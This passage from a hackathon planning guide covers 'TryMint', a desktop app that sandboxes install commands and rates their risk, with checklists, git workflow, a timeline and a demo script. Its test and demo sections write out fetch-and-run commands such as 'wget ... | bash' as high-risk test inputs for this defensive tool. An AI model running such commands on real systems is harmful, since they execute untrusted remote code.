- [ ] `npm install` (if package.json changed)
- [ ] `npm run dev`
- [ ] Verify app launches without errors

## Functionality Tests
- [ ] Command input accepts text
- [ ] "Analyze" button is clickable
- [ ] Loading state displays during analysis
- [ ] Results show after analysis
- [ ] Risk level is displayed correctly
- [ ] Database stores scan results

## Windows-Specific Tests
- [ ] File paths work correctly (backslashes vs forward slashes)
- [ ] Temp directories are created in Windows format
- [ ] Environment variables are read correctly
- [ ] Process monitoring works on Windows
- [ ] Database file location is accessible

## UI/UX Tests
- [ ] All buttons respond to clicks
- [ ] Input fields accept text
- [ ] Dropdowns work (if any)
- [ ] No visual glitches
- [ ] Responsive design works
- [ ] Colors display correctly

## Error Handling
- [ ] Empty command shows appropriate message
- [ ] Invalid commands are handled gracefully
- [ ] Network errors don't crash the app
- [ ] File permission errors are caught

## Performance
- [ ] App starts in under 5 seconds
- [ ] Analysis completes in reasonable time
- [ ] No memory leaks (check Task Manager)
- [ ] UI remains responsive during analysis

## Cross-Platform Issues
- [ ] Document any Windows-specific bugs
- [ ] Note differences from macOS behavior
- [ ] Test edge cases with Windows paths

## End of Day
- [ ] Create GitHub issues for bugs found
- [ ] Update this checklist
- [ ] Sync with Developer 1
- [ ] Commit documentation updates
```

---

### Step 13: Verify Your Setup

Run through this checklist:

```powershell
# ✅ Node.js installed
node --version   # Should show v18+

# ✅ npm installed
npm --version    # Should show 9+

# ✅ Git installed
git --version

# ✅ Python installed
python --version  # Should show 3.11+

# ✅ Project cloned
cd ~/hackathon/trymint
git status

# ✅ Dependencies installed
npm list --depth=0

# ✅ App runs
npm run dev
# App should open in Electron window
```

---

## Project Structure

### Complete Directory Tree

```
trymint/
├── .gitignore
├── .env.example
├── README.md
├── package.json
├── package-lock.json
├── vite.config.js
├── tailwind.config.js
├── postcss.config.js
├── electron-builder.yml
│
├── public/                    # Static assets
│   └── icon.png              # App icon (create later)
│
├── src/
│   ├── main/                 # Electron Main Process (Node.js)
│   │   ├── main.js           # Entry point
│   │   ├── preload.js        # Context bridge
│   │   ├── ipc.js            # IPC handlers (Developer 1 creates)
│   │   └── window.js         # Window management (Developer 1 creates)
│   │
│   ├── renderer/             # React Frontend
│   │   ├── App.jsx           # Main component
│   │   ├── main.jsx          # React entry
│   │   ├── index.html        # HTML template
│   │   ├── index.css         # Tailwind imports
│   │   └── components/       # React components (Developer 1 creates)
│   │       ├── CommandInput.jsx
│   │       ├── RiskCard.jsx
│   │       ├── LogViewer.jsx
│   │       ├── HistoryList.jsx
│   │       └── LicenseManager.jsx
│   │
│   ├── database/             # SQLite Logic (Developer 1 creates)
│   │   ├── schema.js         # Database schema ✅ Created
│   │   ├── queries.js        # SQL queries
│   │   └── init.js           # Initialization
│   │
│   └── sandbox/              # Sandboxing Logic (Developer 1 creates)
│       ├── executor.js       # Command execution
│       ├── monitor.js        # File/network monitoring
│       └── analyzer.js       # Risk analysis
│
├── docs/                     # Documentation (Developer 2 owns)
│   ├── SETUP.md              # This file
│   ├── USER_GUIDE.md         # How to use TryMint
│   ├── API.md                # Internal API docs
│   └── DEMO_SCRIPT.md        # Presentation script
│
├── tests/                    # Testing files (Developer 2 owns)
│   ├── test-commands.md      # Test cases ✅ Created
│   ├── BUG_REPORT_TEMPLATE.md # Bug template ✅ Created
│   └── TESTING_CHECKLIST.md  # Daily checklist ✅ Created
│
├── dist/                     # Build output (gitignored)
├── release/                  # Packaged apps (gitignored)
└── node_modules/             # Dependencies (gitignored)
```

---

## GitHub Workflow (Zero Merge Conflicts)

### Branch Strategy

```
main (protected - only merge via PR)
  │
  └── development (active work)
        │
        ├── dev1-sandbox (Developer 1: sandboxing logic)
        ├── dev1-database (Developer 1: database queries)
        ├── dev1-ui (Developer 1: React components)
        │
        └── dev2-docs (Developer 2: documentation)
        └── dev2-testing (Developer 2: test scripts)
```

### File Ownership Rules

| Developer | OWNS (Full Edit Rights) | NEVER TOUCH |
|-----------|------------------------|-------------|
| **Developer 1 (macOS)** | `src/main/**`<br>`src/renderer/**`<br>`src/database/**`<br>`src/sandbox/**`<br>`package.json`<br>`vite.config.js`<br>`tailwind.config.js` | `docs/**`<br>`tests/**`<br>`README.md` (except setup section) |
| **Developer 2 (Windows)** | `docs/**`<br>`tests/**`<br>`README.md` (usage sections)<br>GitHub Issues | `src/**`<br>`package.json`<br>Config files |

**Golden Rule:** If you don't own it, don't edit it. If you need a change, ask your teammate.

---

### Developer 1 Workflow (macOS)

#### Starting a New Feature

```bash
# Always start from development
git checkout development
git pull origin development

# Create feature branch
git checkout -b dev1-sandbox

# Work on your feature
# Edit files in src/sandbox/

# Commit frequently with clear messages
git add src/sandbox/executor.js
git commit -m "Add command executor with timeout support"

git add src/sandbox/monitor.js
git commit -m "Implement file system monitoring with chokidar"

# Push to GitHub
git push origin dev1-sandbox
```

#### Creating a Pull Request

1. Go to GitHub repository
2. Click "Pull requests" → "New pull request"
3. Base: `development` ← Compare: `dev1-sandbox`
4. Title: `[Feature] Add command sandboxing logic`
5. Description:
   ```
   ## Changes
   - Implemented isolated command execution
   - Added file system monitoring
   - Created temporary sandbox directories
   
   ## Testing
   - Tested with npm install commands
   - Verified file changes are tracked
   - Confirmed isolation works
   
   ## Screenshots
   [Add if relevant]
   
   ## Notes for Tester (Developer 2)
   - Test with: `npm install lodash`
   - Check that temp directory is created
   - Verify no files created outside sandbox
   ```
6. Assign Developer 2 as reviewer
7. Add labels: `backend`, `core-feature`
8. Click "Create pull request"

#### After Developer 2 Approves

1. Merge the PR on GitHub
2. Delete the feature branch:
   ```bash
   git checkout development
   git pull origin development
   git branch -d dev1-sandbox
   ```

---

### Developer 2 Workflow (Windows)

#### Testing Developer 1's Work

```powershell
# Pull latest development
git checkout development
git pull origin development

# Check what's new
git log --oneline -5

# Install any new dependencies
npm install

# Run the app
npm run dev

# Test thoroughly using your checklist
```

#### Reviewing a Pull Request

1. Go to GitHub → Pull Requests
2. Click on the PR from Developer 1
3. Read the description and changes
4. **Test locally:**
   ```powershell
   # Fetch the branch
   git fetch origin dev1-sandbox
   
   # Check it out
   git checkout dev1-sandbox
   
   # Install dependencies (if needed)
   npm install
   
   # Run the app
   npm run dev
   
   # Test according to the PR description
   ```

5. **If bugs found:**
   - Comment on the PR with details
   - Use bug report template
   - Request changes

6. **If everything works:**
   - Click "Review changes"
   - Select "Approve"
   - Add comment: "Tested on Windows 11 - all features working as expected"
   - Click "Submit review"

#### Creating Documentation PRs

```powershell
# Create docs branch
git checkout development
git pull origin development
git checkout -b dev2-user-guide

# Write documentation
# Edit docs/USER_GUIDE.md

# Commit
git add docs/USER_GUIDE.md
git commit -m "Add comprehensive user guide with screenshots"

# Push
git push origin dev2-user-guide

# Create PR on GitHub
# Base: development ← Compare: dev2-user-guide
```

---

### Sync Schedule (Critical for Success)

**Every 4-6 hours during the hackathon:**

1. **Both developers:**
   ```bash
   # Stop what you're doing
   # Commit current work (even if incomplete)
   git add .
   git commit -m "WIP: Feature name"
   
   # Pull latest
   git checkout development
   git pull origin development
   
   # Merge into your feature branch
   git checkout your-feature-branch
   git merge development
   
   # Resolve any conflicts (rare if following file ownership)
   # Continue working
   ```

2. **Quick sync call (5 minutes max):**
   - Developer 1: "I finished X, working on Y next"
   - Developer 2: "Tested X, found issue Z"
   - Both: Agree on priorities for next session

---

### Handling Merge Conflicts (Emergency)

If you see this:

```
CONFLICT (content): Merge conflict in src/main/ipc.js
Automatic merge failed; fix conflicts and then commit the result.
```

**Don't panic. Follow these steps:**

1. **Communicate immediately:**
   ```
   Developer 1 → Developer 2: "I have a merge conflict in ipc.js. Did you edit this file?"
   Developer 2 → Developer 1: "No, I only touched docs/"
   ```

2. **Open the conflicted file:**
   ```javascript
   <<<<<<< HEAD
   // Your changes
   const handleAnalyze = async (command) => {
   =======
   // Their changes
   const handleCommand = async (cmd) => {
   >>>>>>> development
   ```

3. **Decide together which version to keep**, or combine them:
   ```javascript
   // Combined version
   const handleAnalyze = async (command) => {
   ```

4. **Remove conflict markers and save:**
   ```bash
   # Mark as resolved
   git add src/main/ipc.js
   
   # Complete the merge
   git commit -m "Resolve merge conflict in ipc.js - kept handleAnalyze name"
   
   # Push
   git push origin your-branch
   ```

---

### Conflict Prevention Checklist

**Before every commit:**
- [ ] Am I editing a file I own?
- [ ] Have I pulled latest changes?
- [ ] Have I synced recently (within 6 hours)?
- [ ] Is my commit message clear?

**Before every push:**
- [ ] Did I test my changes?
- [ ] Am I pushing to my own branch (not main or development)?
- [ ] Have I communicated with my teammate?

---

## Development Timeline

### 48-Hour Breakdown

#### Hours 0-4: Foundation (Both in Sync)

**Developer 1:**
- [ ] Create GitHub repo
- [ ] Setup project structure
- [ ] Push initial code (already done if following this guide)
- [ ] Create development branch
- [ ] Notify Developer 2 to clone

**Developer 2:**
- [ ] Clone repository
- [ ] Install all dependencies
- [ ] Verify `npm run dev` works
- [ ] Create test command list
- [ ] Create bug report template
- [ ] Create testing checklist

**Sync Point:** Both can run the app successfully

---

#### Hours 4-12: Core Sandboxing (Developer 1 Focus)

**Developer 1:**
- [ ] Implement `src/sandbox/executor.js`
  - Create temporary sandbox directory
  - Execute commands in isolation
  - Capture stdout/stderr
  - Handle timeouts
- [ ] Implement `src/sandbox/monitor.js`
  - Monitor file system changes with chokidar
  - Track created/modified/deleted files
  - Record file sizes
- [ ] Test on macOS with various commands

**Developer 2:**
- [ ] Pull and test each commit
- [ ] Test commands from your test list
- [ ] Report bugs immediately
- [ ] Start writing user documentation outline
- [ ] Take screenshots of UI for docs

**Sync Points:**
- After 2 hours: Quick check-in
- After 4 hours: Test executor.js
- After 8 hours: Full testing of monitoring

---

#### Hours 12-20: Risk Analysis & Database (Developer 1 Focus)

**Developer 1:**
- [ ] Implement `src/sandbox/analyzer.js`
  - Risk scoring algorithm
  - Detect suspicious patterns
  - Calculate risk levels
- [ ] Implement `src/database/queries.js`
  - Insert scan results
  - Query history
  - Store file changes and network activity
- [ ] Create `src/main/ipc.js`
  - Handle analyze-command IPC call
  - Connect sandbox → analyzer → database
  - Return results to renderer

**Developer 2:**
- [ ] Test risk scoring accuracy
- [ ] Verify database stores correctly
- [ ] Test on Windows-specific commands
- [ ] Document Windows path issues
- [ ] Continue writing user guide

**Sync Points:**
- After 4 hours: Test risk analyzer
- After 8 hours: End-to-end test (command → result → database)

---

#### Hours 20-32: React UI (Developer 1 Focus)

**Developer 1:**
- [ ] Create `src/renderer/components/CommandInput.jsx`
  - Input field with validation
  - Analyze button
  - Loading state
- [ ] Create `src/renderer/components/RiskCard.jsx`
  - Display risk level with colors
  - Show file changes
  - Show network activity
  - Show processes
- [ ] Create `src/renderer/components/LogViewer.jsx`
  - Real-time command output
  - Syntax highlighting
- [ ] Create `src/renderer/components/HistoryList.jsx`
  - List past scans from database
  - Click to view details
- [ ] Update `src/renderer/App.jsx`
  - Integrate all components
  - Connect to IPC
  - Handle state management

**Developer 2:**
- [ ] Test each component as it's built
- [ ] Report UI bugs and suggestions
- [ ] Test user flows
- [ ] Take screenshots for presentation
- [ ] Finish user documentation
- [ ] Start demo script

**Sync Points:**
- After 4 hours: Test CommandInput and basic flow
- After 8 hours: Test full UI integration
- After 12 hours: Complete end-to-end user flow test

---

#### Hours 32-40: Polish & Windows Build (Split Focus)

**Developer 1:**
- [ ] Fix critical bugs reported by Developer 2
- [ ] Add error handling and validation
- [ ] Improve loading states
- [ ] Add toast notifications for errors
- [ ] Build Windows .exe:
  ```bash
  npm run build:win
  ```
- [ ] Test packaged app works

**Developer 2:**
- [ ] Full regression testing
- [ ] Test packaged .exe on fresh Windows machine (if possible)
- [ ] Finalize user documentation
- [ ] Write README with installation instructions
- [ ] Create demo script
- [ ] Prepare presentation slides

**Sync Points:**
- After 4 hours: Test Windows build
- After 8 hours: Final bug triage

---

#### Hours 40-48: Demo Prep & Final Testing (Both Together)

**Both:**
- [ ] Practice demo together (3-5 times)
- [ ] Test on fresh machine if possible
- [ ] Upload release to GitHub
- [ ] Record backup demo video
- [ ] Prepare Q&A responses
- [ ] Create presentation slides
- [ ] Final rehearsal
- [ ] Rest before presentation!

**Final Deliverables:**
- [ ] Working desktop app (.exe for Windows, .dmg for macOS)
- [ ] GitHub repository with clear README
- [ ] User documentation
- [ ] Demo video (backup)
- [ ] Presentation slides
- [ ] Confident team ready to present

---

## Testing Strategy

### Test Command Library

Create comprehensive test cases covering:

#### 1. Low Risk Commands

```bash
# File operations
echo "test"
mkdir test_dir
touch test_file.txt
ls -la

# Package managers (legitimate packages)
npm install lodash
pip install requests
```

**Expected:** Risk Level = LOW

---

#### 2. Medium Risk Commands

```bash
# Multiple dependencies
npm install express mongoose dotenv

# Scripts with post-install hooks
npm install some-package-with-scripts

# Large downloads
pip install tensorflow
```

**Expected:** Risk Level = MEDIUM

---

#### 3. High Risk Commands (Safe to Test)

```bash
# Unknown network sources
curl https://random-unknown-domain.com/script.sh

# Piped execution patterns
wget http://example.com/install.sh -O - | bash

# System modification attempts (will be blocked in sandbox)
sudo apt install fake-package
```

**Expected:** Risk Level = HIGH

---

### Platform-Specific Testing

#### Windows-Specific (Developer 2)

```powershell
# Test Windows paths
cd C:\Users\Public
mkdir "folder with spaces"

# Test environment variables
echo %USERPROFILE%
echo %APPDATA%
echo %TEMP%

# Test Windows package managers
npm install windows-build-tools
choco install nodejs
```

#### macOS-Specific (Developer 1)

```bash
# Test macOS paths
cd ~/Library
mkdir test_app_support

# Test environment variables
echo $HOME
echo $USER
echo $TMPDIR

# Test macOS package managers
brew install node
```

---

### Bug Reporting Workflow

**When Developer 2 finds a bug:**

1. **Reproduce it 2-3 times** to confirm
2. **Document clearly:**
   - Steps to reproduce
   - Expected vs actual behavior
   - Screenshots/error messages
   - Environment details
3. **Create GitHub Issue:**
   - Title: `[Bug] Brief description`
   - Use bug report template
   - Add label: `bug`, `windows` (if Windows-specific)
   - Assign to Developer 1
   - Set priority: `critical` / `high` / `medium` / `low`
4. **Notify Developer 1** immediately if critical
5. **Continue testing** other features

**When Developer 1 receives bug report:**

1. **Acknowledge** within 30 minutes
2. **Reproduce locally**
3. **Fix** or respond with questions
4. **Push fix** to development
5. **Comment on issue** when fixed
6. **Ask Developer 2 to verify**

---

## Demo Preparation

### 3-Minute Demo Script

```
[0:00-0:30] HOOK
"How many of you have copy-pasted an install command from 
Stack Overflow without reading it? 
[Wait for hands/reactions]
We all have. And that's dangerous.

Last year, there were over 200 supply chain attacks on npm alone. 
Developers need visibility before they commit."

[0:30-1:00] PROBLEM
"The problem is trust. When you run 'npm install something', you're 
trusting:
• The package author
• All dependencies (sometimes hundreds)
• The package registry
• Any post-install scripts

One malicious package can steal your environment variables, 
SSH keys, or inject backdoors."

[1:00-2:15] SOLUTION - LIVE DEMO
"This is TryMint. Let me show you how it works.

[Type: npm install lodash]
First, a safe command. Click Analyze.

[Show sandbox execution]
TryMint runs this in an isolated environment on my local machine.
No Docker, no VMs, just OS-level sandboxing.

[Show results]
Risk: LOW
• Created files only in node_modules
• Downloaded from official npm registry
• No system modifications
• No suspicious network activity

[Type: curl unknown-site.com/script.sh | bash]
Now, let's try something risky.

[Show results]
Risk: HIGH
• Contacted unknown domain
• Attempted to execute downloaded script
• Tried to modify shell configuration
• Red flags everywhere

TryMint explains what happened in plain English, 
stores the results in a local database, 
and lets YOU decide whether to proceed."

[2:15-2:45] TECHNOLOGY
"Built in 48 hours with:
• Electron for cross-platform desktop
• React for the UI
• SQLite for local storage
• Node.js for sandboxing

Everything runs locally. No cloud. No mandatory login. 
Your data stays on your machine."

[2:45-3:00] CALL TO ACTION
"TryMint brings transparency to software installation. 
Try before you install.

Download it now from our GitHub repo. 
Thank you! Questions?"
```

---

### Demo Preparation Checklist

**One Week Before (if possible):**
- [ ] Practice demo alone 10 times
- [ ] Time yourself - keep under 3 minutes
- [ ] Prepare backup slides if live demo fails

**One Day Before:**
- [ ] Test app on fresh machine
- [ ] Record backup demo video
- [ ] Prepare USB drive with installer
- [ ] Test projector/screen sharing

**Day Of:**
- [ ] Fully charged laptop
- [ ] Backup laptop if possible
- [ ] Rehearse one final time
- [ ] Arrive early to test A/V

---

### Presentation Slides Outline

**Slide 1: Title**
- TryMint logo/name
- Tagline: "Try Before You Install"
- Team names

**Slide 2: The Problem**
- Supply chain attacks rising
- Developers blindly trust install commands
- Statistics: 200+ npm attacks in 2023

**Slide 3: Current Solutions**
- Docker (too heavy)
- VMs (complex setup)
- Manual code review (time-consuming)
- Nothing simple and fast

**Slide 4: Our Solution**
- Live demo (main focus)
- Spend 80% of time here

**Slide 5: How It Works**
- Simple architecture diagram
- Sandbox → Analyze → Report → Decide

**Slide 6: Tech Stack**
- Electron + React + SQLite
- Everything local, no cloud
- Cross-platform

**Slide 7: Features**
- Real-time monitoring
- Risk assessment
- History/audit trail
- Plain English explanations

**Slide 8: Future Roadmap**
- Package reputation database
- Community risk reports
- Browser extension
- CI/CD integration

**Slide 9: Thank You**
- Download link (GitHub)
- Contact info
- Questions

---

### Q&A Preparation

**Likely Questions:**

**Q: "How does the sandbox prevent malicious code from escaping?"**
A: "We use OS-level process isolation similar to containers but lighter weight. On Linux, we use chroot and namespaces. On macOS, we use the App Sandbox API. On Windows, we use restricted user tokens. The sandbox can't access the parent file system or network without explicit permission."

**Q: "What if a package uses obfuscation to hide malicious code?"**
A: "TryMint monitors behavior, not code. Even if the code is obfuscated, we see what it actually tries to do - network calls, file modifications, process spawning. Behavior is harder to hide than code."

**Q: "How do you handle false positives?"**
A: "We use a scoring system, not binary yes/no. A package that contacts many external servers gets flagged, but we show you exactly what it contacted so you can decide. We also plan to build a community database of known-safe behaviors."

**Q: "Why not just use Docker?"**
A: "Docker is great for production isolation, but it's overkill for quickly testing an install command. TryMint starts in seconds, uses minimal resources, and doesn't require Docker knowledge. We wanted something as simple as copy-paste."

**Q: "What about performance impact?"**
A: "Minimal. The sandbox adds about 100-200ms overhead. Most of the time is the actual installation. On a modern machine, analyzing 'npm install' is barely slower than running it normally."

**Q: "Can this detect zero-day attacks?"**
A: "Not specifically, but it detects suspicious behaviors that zero-days often use: unusual network activity, system file modifications, privilege escalation attempts. It won't stop a perfectly crafted zero-day, but it raises the bar significantly."

**Q: "How is this different from antivirus?"**
A: "Antivirus scans for known malware signatures. TryMint analyzes behavior in real-time. Think of it as a 'test drive' for software. You get to see what it does before deciding to keep it."

---

## Fallback Plan

### If Running Out of Time

**Priority 1: Core Demo Must Work (40 hours)**
- [ ] Command input
- [ ] Sandbox execution
- [ ] Basic risk scoring
- [ ] Display results
- [ ] ONE working example of each risk level

**Priority 2: Nice to Have (44 hours)**
- [ ] History/database display
- [ ] Better UI styling
- [ ] AI summaries
- [ ] Windows .exe build

**Priority 3: Stretch Goals (48 hours)**
- [ ] macOS .dmg build
- [ ] Advanced risk detection
- [ ] License system
- [ ] Website

### Minimum Viable Demo

If absolutely pressed for time, you can present with:

1. **Working sandbox** that executes commands safely
2. **Basic UI** showing command input and results
3. **Simple risk scoring** (even just counting red flags)
4. **Clear explanation** of what you built and why

**Demo script for MVP:**
"We built a proof-of-concept in 48 hours. Here's what works: 
[Show command execution in sandbox]
[Show risk detection]
Here's what we learned and where we'd take it next."

Judges respect honesty and clear thinking over half-broken "complete" features.

---

## Final Checklist

### Developer 1 (macOS) - Before Hackathon Starts

- [ ] Homebrew installed
- [ ] Node.js 18+ installed
- [ ] Git configured
- [ ] VS Code installed with extensions
- [ ] Xcode Command Line Tools installed
- [ ] GitHub repo created
- [ ] Project cloned and dependencies installed
- [ ] `npm run dev` works
- [ ] Read this entire document
- [ ] Test commands prepared

### Developer 2 (Windows) - Before Hackathon Starts

- [ ] Node.js 18+ installed
- [ ] Git configured
- [ ] Python installed
- [ ] VS Code installed with extensions
- [ ] Windows Build Tools installed
- [ ] Project cloned and dependencies installed
- [ ] `npm run dev` works
- [ ] Test command list created
- [ ] Bug report template ready
- [ ] Testing checklist ready
- [ ] Read this entire document

### Together - Before Hackathon Starts

- [ ] Communication method agreed (Discord/Slack/WhatsApp)
- [ ] Sync schedule agreed (every 4-6 hours)
- [ ] File ownership rules understood
- [ ] Demo flow practiced once
- [ ] Backup plan agreed
- [ ] Both confident and ready

---

## Emergency Contacts & Resources

### Quick Links

| Resource | URL |
|----------|-----|
| **Node.js Docs** | https://nodejs.org/docs/latest/api/ |
| **Electron Docs** | https://www.electronjs.org/docs/latest |
| **React Docs** | https://react.dev |
| **Tailwind Docs** | https://tailwindcss.com/docs |
| **better-sqlite3** | https://github.com/WiseLibs/better-sqlite3 |
| **Stack Overflow** | https://stackoverflow.com/questions/tagged/electron |

### Troubleshooting

**App won't start:**
```bash
# Kill any running instances
pkill -f electron  # macOS/Linux
taskkill /F /IM electron.exe  # Windows

# Clear cache
rm -rf node_modules
npm install
```

**Database errors:**
```bash
# Check database file exists
ls ~/Library/Application\ Support/trymint/  # macOS
dir %APPDATA%\trymint\  # Windows

# Rebuild better-sqlite3
npm rebuild better-sqlite3
```

**Build errors:**
```bash
# Clean everything
npm run clean
npm install
npm run dev
```

---

## You've Got This! 🚀

You now have:
- ✅ Complete development environment setup
- ✅ All dependencies installed
- ✅ Project structure ready
- ✅ Git workflow planned
- ✅ Testing strategy defined
- ✅ Demo prepared
- ✅ Fallback plan ready

**Remember:**
1. Communicate often (every 4-6 hours)
2. Stick to file ownership rules
3. Test early and frequently
4. Cut features ruthlessly if needed
5. Focus on a working demo, not perfection

**You're building something real that solves a real problem.**

**Good luck! Build something amazing! 🎉**
